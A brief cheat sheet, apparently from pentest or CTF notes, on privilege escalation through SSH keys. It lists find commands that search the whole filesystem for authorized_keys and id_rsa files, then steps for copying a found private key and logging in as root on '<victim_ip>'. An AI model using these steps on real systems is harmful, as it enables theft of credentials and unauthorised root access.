# Escalation via SSH Keys

---
## Sensitive files - 
```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
---
## Using SSH key to login - 
- Copy and paste the id_rsa into a file in ur local system and do the following - 
```bash
chmod 600 id_rsa
ssh -i id_rsa root@<victim_ip> 
```